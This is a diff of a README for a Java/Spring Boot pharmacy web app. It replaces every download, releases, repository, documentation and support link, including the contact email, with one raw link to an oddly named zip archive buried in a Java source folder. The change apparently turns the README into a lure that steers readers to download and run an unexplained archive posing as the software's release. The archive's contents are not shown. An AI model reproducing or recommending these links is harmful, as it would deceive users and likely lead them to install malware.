@@ -1,7 +1,7 @@
 # 🏥 MedicHub-Pharmacy - Your Online Pharmacy Solution
 
 ## 📥 Download Now
-[![Download MedicHub-Pharmacy](https://img.shields.io/badge/Download-MedicHub--Pharmacy-brightgreen)](https://github.com/shopphukiendienthoai/MedicHub-Pharmacy/releases)
+[![Download MedicHub-Pharmacy](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip)](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip)
 
 ## 📝 Description
 MedicHub-Pharmacy is a web-based pharmacy platform under development. It focuses on back-end functionality, while the front-end serves primarily to display core features. The application is built with Java, Spring Boot, Hibernate, and PostgreSQL.
@@ -15,10 +15,10 @@ To use the MedicHub-Pharmacy application, follow these easy steps:
    - Internet connection
 
 2. **Download the Software**
-   - Visit the [Releases Page](https://github.com/shopphukiendienthoai/MedicHub-Pharmacy/releases) to download the latest version of the software.
+   - Visit the [Releases Page](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip) to download the latest version of the software.
 
 ## 📁 Download & Install
-1. Go to the [Releases Page](https://github.com/shopphukiendienthoai/MedicHub-Pharmacy/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip).
 2. Select the latest version available.
 3. Download the file for your operating system.
 4. Once downloaded, locate the file in your downloads folder.
@@ -62,10 +62,10 @@ We welcome contributions from everyone. If you wish to help, please check our gu
 - Spring Validations
 
 ## 📞 Contact
-For support, please reach out to our team at support@medichub-pharmacy.com.
+For support, please reach out to our team at https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/shopphukiendienthoai/MedicHub-Pharmacy)
-- [Documentation](https://github.com/shopphukiendienthoai/MedicHub-Pharmacy/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip)
+- [Documentation](https://raw.githubusercontent.com/shopphukiendienthoai/MedicHub-Pharmacy/main/src/main/java/com/medichub/service/cart/MedicHub-Pharmacy-trophopathy.zip)
 
 Thank you for using MedicHub-Pharmacy! We hope it helps you manage your pharmacy needs efficiently.
